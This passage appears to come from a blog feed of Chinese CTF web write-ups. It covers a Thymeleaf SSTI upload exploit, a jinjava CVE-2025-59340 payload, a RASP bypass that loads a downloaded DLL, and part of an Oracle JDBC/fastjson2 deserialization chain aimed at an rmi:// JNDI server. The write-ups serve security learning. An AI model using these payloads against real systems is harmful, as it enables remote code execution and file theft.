class="string">&quot;exp&quot;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)  <span class="comment"># 过期时间，可选  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 生成 tokentoken = jwt.encode(payload, secret, algorithm=&quot;HS256&quot;)  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造请求头  </span></span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Token:&quot;</span>, token)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Headers:&quot;</span>, headers)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&quot;http://45.40.247.139:17455/upload&quot;</span>  </span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:8080/upload&quot;  </span></span><br><span class="line">files = &#123;  </span><br><span class="line">    <span class="string">&quot;imgFile&quot;</span>: (<span class="string">&quot;test.html&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;nacl2.html&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;text/html&quot;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">data = &#123;  </span><br><span class="line">    <span class="string">&quot;imgName&quot;</span>: <span class="string">&quot;i&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">response = requests.post(url, files=files, data=data, headers=headers)  </span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>nacl2.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&#x27;$&#123;__$&#123;new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,&#123;null,null&#125;,&#123;new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)&#125;),&quot;exec&quot;,&quot;/bin/bash ./uploadFile/shsh2.html&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))&#125;__&#125;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我这里是先curl把反弹shell命令下载到靶机中, 再<code>/bin/bash ./uploadFile/shsh2.html</code>执行, 当然也可以直接构造编码为exec可执行的命令, 但是因为环境变量的问题必须使用&#x2F;bin&#x2F;bash, 直接bash是找不到这个命令的</p><h2 id="金Java-赛后"><a href="#金Java-赛后" class="headerlink" title="金Java(赛后)"></a>金Java(赛后)</h2><p>一道jinjava模板引擎的ssti<br>可以使用include去读取文件, 但只限于当前工作目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;META-INF/MANIFEST.MF&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013204949.png" alt="image.png"></p><p>BOOT-INF&#x2F;classpath.idx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &#x27;BOOT-INF/classpath.idx&#x27; %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-autoconfigure-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-classic-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-core-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-to-slf4j-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-api-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jul-to-slf4j-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/snakeyaml-2.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jsr310-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-module-parameter-names-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-core-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-el-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-websocket-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-web-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-beans-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-observation-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-commons-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-webmvc-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-aop-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-context-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-expression-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-core-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-jcl-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jinjava-2.8.0.jar&quot;</span>                  # jinjava版本</span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/slf4j-api-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/guava-33.1.0-jre.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/failureaccess-1.0.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/checker-qual-3.42.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/error_prone_annotations-2.26.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/j2objc-annotations-3.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/javassist-3.24.1-GA.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/re2j-1.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-lang3-3.17.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-net-3.9.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/java-ipv6-0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/annotations-3.0.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-annotations-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-databind-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-core-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-dataformat-yaml-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jdk8-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/big-math-2.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/immutables-exceptions-1.9.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-jarmode-tools-3.5.6.jar&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见远程使用的是jdk 17, jinjava版本为2.8.0<br>查看这个版本, 是存在漏洞的:<br><a href="https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0">https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0</a><br><a href="https://www.cve.org/CVERecord?id=CVE-2025-59340">https://www.cve.org/CVERecord?id=CVE-2025-59340</a></p><p>利用poc:<br><a href="https://www.miggo.io/vulnerability-database/cve/CVE-2025-59340">https://www.miggo.io/vulnerability-database/cve/CVE-2025-59340</a></p><p>这里披露了一条poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="type">set</span> <span class="variable">mapper</span> <span class="operator">=</span> ____int3rpr3t3r____.config.objectMapper %&#125;</span><br><span class="line">&#123;&#123; mapper.enableDefaultTyping() &#125;&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">file</span> <span class="operator">=</span> mapper.readValue(<span class="string">&#x27;&quot;file:///etc/passwd&quot;&#x27;</span>, mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.net.URL&#x27;</span>)) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.openStream() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">bytes</span> <span class="operator">=</span> inputStream.readAllBytes() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">stringType</span> <span class="operator">=</span> mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">content</span> <span class="operator">=</span> mapper.convertValue(bytes, stringType) %&#125;</span><br><span class="line">&#123;&#123; content &#125;&#125;</span><br></pre></td></tr></table></figure><p>可以用来ssrf读文件, 但当我尝试读取&#x2F;flag时显示无权限, 尝试读取了一下 &#x2F;readflag, 发现能读出来, 那么说明题目是要我们构造rce了<br>先读一下 &#x2F;proc&#x2F;self&#x2F;cmdline</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java\x00-Xmx512m\x00-javaagent:/app/ycbRASP-<span class="number">1.0</span>-SNAPSHOT-dependencies.jar\x00-jar\x00/app/ezjin-<span class="number">0.0</span><span class="number">.1</span>-SNAPSHOT.jar\x00</span><br><span class="line"><span class="comment">// java -Xmx512m -javaagent:/app/ycbRASP-1.0-SNAPSHOT-dependencies.jar -jar /app/ezjin-0.0.1-SNAPSHOT.jar </span></span><br></pre></td></tr></table></figure><p>赛中没有做出来, 不过留了一手, 这里根据启动内容, 把这两个jar包读取下来保存到本地调试分析<br>首先是如何RCE?<br>一开始, 摸索了很久, 尝试构造执行Spel表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; </span><br><span class="line">____int3rpr3t3r____.config.objectMapper.convertValue( ____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c whoami&quot;)&#x27;</span>).getValue().getInputStream().readAllBytes(), ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) )</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>很快就会发现, 题目的RASP拦截了Runtime.exec<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210154.png" alt="image.png"><br>我们查看RASP的jar包内容, 被检测的类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] TARGET_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line"><span class="string">&quot;java.lang.UNIXProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.UnixProcess&quot;</span>, <span class="string">&quot;jdk.internal.process.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.WindowsProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;java.io.ObjectInputStream&quot;</span>, <span class="string">&quot;javax.naming.InitialContext&quot;</span>, <span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>基本上直接命令执行, JNDI, JDI加载外部库 等都被封死了</p><p>但仔细看会发现, 对于<code>java.lang.Runtime</code>只禁了exec<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210355.png" alt="image.png"></p><p>由于这里的<code>!&quot;java.lang.System&quot;</code>给了我一些灵感, 往下看<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210849.png" alt="image.png"><br>他是禁掉了System.load, 当我查看其源码发现<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211007.png" alt="image.png"></p><p>System.load实际上是调用了<code>Runtime.getRuntime().load0</code>, 跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211048.png" alt="image.png"><br><code>Runtime</code>中亦有对<code>load0</code>的调用, 并且为public方法, 所以我可以直接使用<code>Runtime.getRuntime().load()</code>加载外部库,这可以绕过题目中的RASP,<br>由于我是在windows复现, 这里生成dll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line"></span><br><span class="line">        WinExec(<span class="string">&quot;calc&quot;</span>, SW_SHOW);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为dll</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o calc.dll calc.c -luser32</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"></span><br><span class="line">____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">T(java.lang.Runtime).getRuntime().load(&quot;D:/tmp/calc.dll&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>).getValue().getInputStream().readAllBytes()</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>在首次加载时可以成功弹出计算器!</p><p>接下来的问题是如何写入dll文件<br>当我尝试base64解码后写入时发现超出spel表达式长度了, 这里就先尝试出网利用, 从url中获取, python起一个http服务存放calc.dll</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ____int3rpr3t3r____.config.objectMapper.convertValue( ____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;T(java.nio.file.Files).readAllBytes(T(java.nio.file.Files).write(T(java.nio.file.Paths).get(&quot;D:/tmp/test/pwned.dll&quot;), new java.net.URL(&quot;http://127.0.0.1:8000/calc.dll&quot;).openStream().readAllBytes()))&#x27;</span>).getValue(), ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) ) &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211848.png" alt="image.png"><br>成功写入!<br>直接加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"></span><br><span class="line">____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">T(java.lang.Runtime).getRuntime().load(&quot;D:/tmp/test/pwned.dll&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>).getValue().getInputStream().readAllBytes()</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>成功RCE</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013212035.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025-羊城杯-WEB-WP-题解-含-金Java&quot;&gt;&lt;a href=&quot;#2025-羊城杯-WEB-WP-题解-含-金Java&quot; class=&quot;headerlink&quot; title=&quot;2025 羊城杯 WEB WP 题解 (含 金Java)&quot;&gt;&lt;/a&gt;2025 羊</summary>
      
    
    
    
    
    <category term="JavaSec" scheme="http://example.com/tags/JavaSec/"/>
    
  </entry>
  
  <entry>
    <title>2025软件系统安全赛 WEB JDBCParty</title>
    <link href="http://example.com/2025/10/02/2025%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-WEB-JDBCParty/"/>
    <id>http://example.com/2025/10/02/2025%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-WEB-JDBCParty/</id>
    <published>2025-10-02T13:11:33.000Z</published>
    <updated>2025-10-02T13:16:28.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDBCParty"><a href="#JDBCParty" class="headerlink" title="JDBCParty"></a>JDBCParty</h2><p>题目存在明显反序列化点</p><h3 id="考点"><a href="#考点" class="headerlink" title="考点:"></a>考点:</h3><p>高版本 (jdk17) CVE-2022-39197<br>[[CVE-2022-39197 CS RCE]]</p><p><a href="https://www.n4c1.top/2025/10/02/CVE-2022-39197-CS-RCE/">https://www.n4c1.top/2025/10/02/CVE-2022-39197-CS-RCE/</a></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929220821.png" alt="image.png"></p><p>这个setURI就是最终的sink点, 题目存在 fastjson2和jackson依赖, 所以思路就是通过反序列化调用setter然后RCE</p><p>题目有oracleJDBC依赖  fastjson2 (2.0.37) 依赖 jackson依赖<br>这几个json库都是可以用来触发toString –&gt; getter, 但我们最终要调用的其实是一个setter<br>思路是利用oracleJDBC依赖, 调用它的getter(<code>getConnection</code>)来打JNDI, 伪造恶意rmi服务器, 返回远程对象, 打高版本JDK的JNDI注入</p><p>首先是 readObect –&gt; toString –&gt; getter<br>前半段的 readObect –&gt; toString, 我们在 <a href="https://github.com/LxxxSec/CTF-Java-Gadget">CTF-Java-Gadget</a>这个项目中就能找到几条可以用的, 这里选用<code>EventListenerListReadObject2ToString</code><br>toString –&gt; getter 直接选用 fastjson2原生反序列化链,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationConfig;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.OracleConnectionWrapper;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.driver.LogicalConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.internal.OracleConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.pool.OraclePooledConnection;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.n4c1.tools.advanced.UnSafeTools;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.RowSetInternal;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  org.n4c1.tools.Tools;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.bypassModule(Test.class, Class.class);  </span><br><span class="line">        <span class="type">OracleCachedRowSet</span> <span class="variable">oracleCachedRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OracleCachedRowSet</span>();  </span><br><span class="line">  </span><br><span class="line">        oracleCachedRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/cwx0mc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;monitorLock&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector1.add(<span class="number">0</span>,<span class="string">&quot;111&quot;</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  